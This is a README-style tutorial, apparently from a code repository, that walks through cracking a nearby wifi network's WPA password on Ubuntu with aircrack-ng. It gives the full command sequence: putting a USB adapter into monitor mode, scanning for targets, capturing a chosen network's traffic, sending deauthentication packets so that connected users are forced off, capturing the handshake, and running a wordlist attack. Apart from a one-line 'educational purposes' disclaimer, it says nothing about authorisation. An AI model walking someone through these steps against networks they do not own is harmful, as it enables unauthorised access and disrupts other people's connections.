# Cracking Wifi Password With Ubuntu #
This repository is intended for only educational purposes. It should not be used for illegal activity.  
First thing you have to do is to make sure ubuntu is up to date. So open up a terminal and write:
``` 
sudo apt-get update
sudo apt-get upgrade
```
The second step is to install the ```aircrack-ng``` which is the tool that we are going to use for getting the wifi password.
```
sudo apt-get install aircrack-ng
```
In order to crack the Password you have to get a usb wifi module. If you don't they maybe you are not going to be able to get it work. 

## Start Monitoring Mode ##
After making sure that the usb wifi antenna works just fine then we have change the antenna state to monitoring. In order to do that we need first to find antennas name. We will open our First-terminal and type:
```
iwconfig
```
then we should find the name of the usb antenna. Mine is `wlx1cbfce3860a6` for example. So now we start the monitoring mode with the command:
```
sudo airmon-ng start wlx1cbfce3860a6
```
Change the word `wlx1cbfce3860a6` accordingly to our own device name. Plus you will see afterwards that the device name has changed to something else. Mine is `wlan0mon` for example.

## Search for nearby wifi ##
In this step we are going to select a wifi that we will crack the password.
```
NOTE: You should be sure that another device is connected to this wifi. For example a phone, tablet, Computer. You will understand later why...
```
So in order to select we have to scan the area. Type:
```
sudo airodump-ng wlan0mon
```
Now in the terminal you can see the BSSIDs and the name of the wifis. Copy the BSSID of the wifi that you are interested in and remember the Channel number of this wifi. 

## Get the handshake
So now we are going to "listen" what this wifi transmits. To do that open a Second-terminal and use:
```
sudo airodump-ng -c X --bssid xx:xx:xx:xx:xx:xx -w FILENAME wlan0mon
```
Where X is the channel number, xx:xx:xx:xx:xx:xx is the BSSID the we copied before and FILENAME is the name of the file that we are going to store data in. Now we have to disconnect everyone from that wifi address. To do that we have to create some traffic to that address. We are going to open a Third-terminal and use this command in order to do that:
```
sudo aireplay-ng --deauth 10 -a xx:xx:xx:xx:xx:xx wlan0mon 
```
So what's the point of creating traffic and disconnecting everyone?? We have to do that cause after everyone disconnects then the will try to log in again. In this way they are trying to tell the password to the router. But we are "listening" the routers channel and we get this password and store it into a file. The password is still in a encoded state and we cannot find it really easy. Now we can stop the traffic and check if we get a handshake. To do that we open up the last and Fourth-terminal and use:
```
sudo aircrack-ng FILENAME.cap
```
In the Encryption section you are going to see something like `WPA (1 handshake, with PMKID)`.If you this message then you have succesfully find a handshake. If you dont then try again to create traffic and then wait for the handshake (or make sure again someone is connected in this wifi).

## Find the password
The last step is all about finding the password from the FILENAME.cap file. So we can turn off the monitoring mode from the First-terminal with the command:
```
sudo airmon-ng stop wlan0mon
``` 
And now we can go in the Fourth-terminal and then download the Passwords.txt file in the same folder. Then just type:
```
sudo aircrack-ng FILENAME.cap -w Passwords.txt
```
And in a few moments if the password is in the Passwords.txt you will find it.